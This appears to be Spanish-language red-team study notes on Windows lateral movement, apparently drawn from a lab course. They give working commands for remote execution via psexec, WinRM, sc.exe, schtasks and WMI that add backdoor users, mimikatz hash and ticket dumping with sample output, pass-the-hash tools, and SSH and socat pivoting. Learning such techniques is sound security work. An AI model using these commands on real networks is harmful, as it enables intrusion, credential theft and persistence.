# Introducción

En este repo aprenderemos sobre movimiento lateral y técnicas que usan los atacantes para moverse alrededor de la red haciendo las menores alertas posbiles. Aprenderemos tecnicas.

# Moverse alrededor de la red

Simplemente el movimiento lateral, es un grupo de tecnicas que usan los atacantes para moverse alrededor de la red. Una vez el atacante a ganado acceso a la máquina, es esencial el movimiento entre redes. 

## Un pequeño ejemplo

Suponemos que somos de "red team" y finalmente nos hemos metido en el código de un repositorio, donde tenemos un target en la red comprometido usando phising. (es el más efectivo)

![image](https://github.com/user-attachments/assets/c85a7bc1-24bd-4f49-8480-ae1aae192c27)

## La perspectiva del atacante

Hay unos "Pasos" que seguir a la hora de hacer movimientos laterales. Simplemente debemos entender protocolos administrativos como WinRM, RDP, VNC o SSH para conectanos a otras maquinas de la red. 

Como atacantes tenemos que ser buenos y meternos en retos contra los blue teams

## Administradores y UAC

Mientras hacemos movmimientos laterales, podemos usar credenciales de administrador pero hay que tener mucho cuidado con esto. es mejor usarç

- CUentas locales
- CUentas de dominio

La diferentes son las restricciones de la (UAC) en caso de querer movernos o hacer comandos necesarios.

# Crear procesos remotamente

## Psexec

- Puerto : 445/TCP (SMB)
- Administrador

Psexec es un metodo para ejectuar procesos remotamente por años. Coge al administrador y ejecuta comandos remotamente al ordenador que tiene acceso.
Psexec es una de las herramientas de sysinternals descarga [aquí](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

Los procesos o pasos a seguir:

- Conectarse con el Admin$ carpeta que podemos subir el binario. Se ejecuta como "psexecvc.exe"
- Conectar al servicio de control y ejecutar dicho servicio en "C:\Windows\psexesvc.exe"
- Crear

![image](https://github.com/user-attachments/assets/d0c4e6f7-4b71-4100-999e-71733c7e080f)

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

## Proceso de creacion usando WinRM

- Puerto 5985/TCP (WindRM HTTP) o 5986/TCP (WinRM HTTPS)
- Remote Management Users

- Este protocolo esta basado en web se usa para mandar "Powershell" comands para los hosts de windows.

 ```
windrx.exe -u:Adminsitrator -p:Mypass123 -r:target cmd
 ```

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

```
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## Crear servicios usando sc

- Puertos 135/TCP 49152-65535/TCP (DCE/RCP)
- Puertos 445/TCP (RCP O SMB)
- Puertos 139/TCP (RCP O SMB)
- Miembros grupo : Administradores

1- Nos conectamos usando DCE/RCP. El cliente se conecta al endpoint, el servidor cataloga que hay un RCP abiert. Responde con una IP y un rango de puertos

![image](https://github.com/user-attachments/assets/d5505fd7-6e15-43b9-b023-68eb9a980ef2)

2- Si la conexión falla, los nombre SMB se guarda.

![image](https://github.com/user-attachments/assets/d1dac505-470d-4ede-8e0d-3904a77eae28)

Podemos crear y ejecutar un servicio

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

El "net user" comando se ejecuta cuando el servicio empieza, creando un suario local en el sistema. El operador de sistema empieza el servicio.

Para parar el servicio y borrarlo

```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

## Crear servicio remotamente controlados

Otra característica de windows son las tareas programas:

```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1"
```
```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

# Movimiento lateras usando WMI

WMI (Windows Management Instrumentation)

WBEM (Web-Based enterprise Management)

En términos simples, WMI administra las tareas que los atacante vas a utilizar para hacer movimiento lateral

## Conectar con WMI por PowerShell

Antes de entablar connexión con Powershell, necesitaremos crear un objeto con usuario y contraseñas. Este objeto se guarda como variable $credential

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Cuando procedamos a entablar la sesión debemos seguir estos protocolos:

- DCOM : RCP a la IP para una conexión por WMI. Por el protocolo 135 usando sc.exe
- Wsmam: WinRM puede ser usada con WMI. El protocolo es el 5985

Para entablar con Porwersell podemos guardar los comandos con la variable $session

```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
Invocar Powershell

```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

## Crear servicios con WMI

Podemos crear servicios con la powershell

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Podemos controlar el servicio o oiniciarlo:

```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Crear una tarea remotamente

Podemos ejecutar tareas usando los comandos por defecto 

```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

BOrrar tarea:

```

Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Instalar paquetes MSI con WMI

# Requiere admin

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

# Autenticación Alternativo

Referimos datos que nosotros usamos para acceder a windows sin necesitdad de saber la contraseña. Es posible porque los protocolos de autenticación que usan windows funcionan a sí.

- NTLM autenticación
- Kerberos autenticación

## NTLM

![image](https://github.com/user-attachments/assets/6467ec96-a570-48d9-af12-91045b1626ce)

## Pass-The-Hash

El resultado de extraer credenciales del host nos puede dar privilegios. Pero si no tenemos suerte jamás crackearemo dichas contraseñas

Para esto, utilizaremos la autenticación de NTLM que como todos sabemos funciona como un reto y simplemente conociendo el hash del pass. Esto es bueno porque nos podemos autentificar sin necesidad de texto plao.

Para extraer los hashes podemos utilizar "mimikatz" para leer archivos locales o extraer hashes de la memoria LSASS

### Extraer hash de la memoria local

Este metodo hace que cogamos los hashe de la maquina local

```
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

```
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

## Pasar hash usando linux

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## Autenticación Kerberos

El usuario manda el usuario y una llave encriptada o KDC usualmente ya utiliza o cargada en el controlador de dominio, kerberos nos crea un ticket para la red.

El KDC crea y manda un ticket de vuelta (TGT), el usuario pide el ticket para servicios especificios, entonces se le da la llave de sesión

TGT esta encriptado usando cuentas "krbtgt", el usuario no puede acceder al contenido

![image](https://github.com/user-attachments/assets/36fba11e-9fb5-43a3-8d16-e38bd6109eee)

Cuando el usuario quiere conectarse a la red como si fuera compartido, como en un web o base de datos, ellos usan TGT para preguntar al KDC por un TGS. Los TGS son tickets que permiten o no la conexión especifica a un usuario ya creado.

![image](https://github.com/user-attachments/assets/0197e9df-8766-4f03-9786-8f32f2ba99eb)

## Pass-the-Ticket

Aveces es posible extraer tickets de kerberos o sesiones usando "mimikatz" El proceso normalmente requiere privilegios de "SYSTEM" en la maquina atacada

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Si tenemos acceso al ticket y no a la llave de sesión correspondiente.

Mientras mimikatz puede xtraer el TGT o TGS de la memoria del LSASS

# Port Forwarding

Muchos de las tecnicas de los movimientos laterales presentar especificos puertos disponibles para el atacante. En redes reales, normalmente los administradores bloquean los puertos o segmentan la red

## Tuneles SSH

El primero protocolo porsupuesto es el SSH llamado "SSH Tunneling". Este protocolo como ya sabemos viene de sistemas linux con un OpenSSH

Se puede usar de diferentes formas dependiendo de la situacion.

![image](https://github.com/user-attachments/assets/7186191d-7812-4a9d-a74f-e5ddf2a6f27b)

## SSH Reenvio de puertos

En un ejemplko, imagina que un firewall no nos deja pasar por dicho puerto, pero otro servidor si puede, utilizariamos por ejemplo los puertos del mismo ssh que nos hemos conectado para ir al siguiente punto.

![image](https://github.com/user-attachments/assets/35ce361b-660e-4fd1-9b7d-0983095f3ea1)

```
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

## SSH Reenvío de puertos local

![image](https://github.com/user-attachments/assets/b83f6aa8-af08-4abc-b511-69fdb564551a)

```
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```


## Reenvío de puertos con socat

```
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

![image](https://github.com/user-attachments/assets/1c0d09ab-62fa-4c66-842f-cd9bd7663bef)





